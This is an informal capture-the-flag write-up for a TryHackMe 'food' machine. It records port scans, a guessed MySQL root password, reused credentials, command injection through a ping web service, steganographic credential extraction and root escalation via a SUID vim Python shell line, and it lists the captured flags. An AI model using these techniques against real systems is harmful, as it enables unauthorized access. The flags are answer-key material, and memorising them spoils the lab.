### Nmap Scan

`nmap -sV -sT -A 10.10.97.69

```
─[glack@parrot]─[~]
└──╼ $nmap -sV -sT -A 10.10.97.69
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-27 02:54 IST
Nmap scan report for 10.10.97.69
Host is up (0.18s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 280c0cd95a7dbee6f43ced1051494d19 (RSA)
|   256 17ce033bbb207809ab76c06d8dc4df51 (ECDSA)
|_  256 078a50b55b4aa76cc8b3a1ca77b90d07 (ED25519)
3306/tcp open  mysql   MySQL 5.7.29-0ubuntu0.18.04.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_5.7.29_Auto_Generated_Server_Certificate
| Not valid before: 2020-03-19T17:21:30
|_Not valid after:  2030-03-17T17:21:30
 mysql-info: 
|   Protocol: 10
|   Version: 5.7.29-0ubuntu0.18.04.1
|   Thread ID: 4
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, SupportsTransactions, FoundRows, IgnoreSpaceBeforeParenthesis, ODBCClient, IgnoreSigpipes, Speaks41ProtocolOld, InteractiveClient, SupportsLoadDataLocal, SupportsCompression, LongColumnFlag, LongPassword, ConnectWithDatabase, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: -o\x07m:<7b~gL\x195%\x0C\x0DI_\x03g
|_  Auth Plugin Name: mysql_native_password
9999/tcp open  abyss?
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Wed, 26 Jul 2023 15:54:32 GMT
|     Content-Length: 4
|     Content-Type: text/plain; charset=utf-8
|     king
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request



```

### Mysql

1. connect to target mysql server using
```
─[✗]─[glack@parrot]─[~]
└──╼ $mysql -h 10.10.97.69 -u root -p
```

guessed the password as `root`

2. a flag and a credentials
```
MySQL [users]> SELECT * FROM User;
+----------+---------------------------------------+
| username | password                              |
+----------+---------------------------------------+
| ramen    | noodlesRTheBest                       |
| flag     | thm{2f30841ff8d9646845295135adda8332} |
+----------+---------------------------------------+
2 rows in set (0.130 sec)

```

Flag 1 - thm{2f30841ff8d9646845295135adda8332}

### Shell

1. SSH into the ,machine using above creds
2. got another flag in bread directory
```
ramen@foodctf:/home/bread$ cat flag
thm{7baf5aa8491a4b7b1c2d231a24aec575}
```

flag2 - thm{7baf5aa8491a4b7b1c2d231a24aec575}

3. found another username
```

ramen@foodctf:/home/bread/resources$ cat index.html

<p>Blame Dan, he keeps messing with the prod servers.</p>
```
4. in the resource directory there were few html documents and contents were that we are able to run a ping command as a user, but there was no service running
5. we are able to trigger the service once we run
`ramen@foodctf:/home/bread$ ./main`

6. We can check what prot the service is running on
`ramen@foodctf:/home/bread$ cat main.go`

`portPtr := flag.Int("p", 15065, "Port number to run the server on")`

7. We can access the created serivce on web browser using(got the /monitor from index.html file)
`http://10.10.97.69:15065/monitor/

8. we are able to run `ping 10.10.10.10` but when try to enter other command we get an error `Ip address invalid`
9. i captured the request over burp and changed the command to `ls -al`, and we get the command output
10. We can run commands this way as the user `uid=1004(bread) gid=1004(bread) groups=1004(bread)`
11. found another flag in 

```
ramen@foodctf:/home/food$ cat .flag
thm{58a3cb46855af54d0660b34fd20a04c1}

```

flag 3 - thm{58a3cb46855af54d0660b34fd20a04c1}

12. found another flag at
```
ramen@foodctf:/$ cat /var/flag.txt
thm{0c48608136e6f8c86aecdb5d4c3d7ba8}
```

flag4 - thm{0c48608136e6f8c86aecdb5d4c3d7ba8}

13. there was a binary named `img` in user `tryhackme` home folder, running it did something. other files were not accessible. 
14. Ran a nmap scan again to check what i missed
```
└──╼ $nmap -T5 --min-rate=10000 -p- 10.10.6.166
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-28 01:50 IST
Warning: 10.10.6.166 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.6.166
Host is up (0.13s latency).
Not shown: 64996 closed tcp ports (conn-refused), 533 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
3306/tcp  open  mysql
9999/tcp  open  abyss
15065/tcp open  unknown
16109/tcp open  unknown
46969/tcp open  unknown

```

15. When trying to connect we are greeted with a strange text
```
┌─[✗]─[glack@parrot]─[~/Desktop/THM/koth_food]
└──╼ $telnet 10.10.97.69 46969

tccr:uwjsasqccywsg
```

decoded this using ROT12 cipher and we get
food:givemecookies after logging in we get shell as  food, but no flag in /food

16. Found another http port open on `http://10.10.6.166:16109/` this had an image on index.html, downloaded the image. There was a cred.txt file hiddent in it
```
┌─[glack@parrot]─[~/Desktop/THM/koth_food]
└──╼ $stehide extract -sf 10.10.6.jpeg

─[glack@parrot]─[~/Desktop/THM/koth_food]
└──╼ $cat creds.txt 
pasta:pastaisdynamic

```
we get another set of credentails

### Priv ESC

1. All users had vim.basic comamnd as SUID bit set

`ramen@foodctf:/home/tryhackme$ find / -type f -perm -4000 2>/dev/null`

`/usr/bin/vim.basic`

2. GTFO bins helped with the command on priv esc
```
sudo install -m =xs $(which vim) .

./vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

had to make some modifications to it

opened `vim`
pressed `ESC` and `:`
then entered this command `python3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")`

gtfobin command would fail because python2 is not installed

2. We get root shell
```
# whoami
root
```

we get a reverse shell on our system using 

3. We find the 5th flag in `/home/tryhackme`
```
# cat flag7	
thm{5a926ab5d3561e976f4ae5a7e2d034fe}
```

4. we find the 6th in `/root`
```
# cat flag	
thm{9f1ee18d3021d135b03b943cc58f34db}
```

### Remaining flag

I went for the writeups for the remaining flags

well no writeups had info abt other flags either


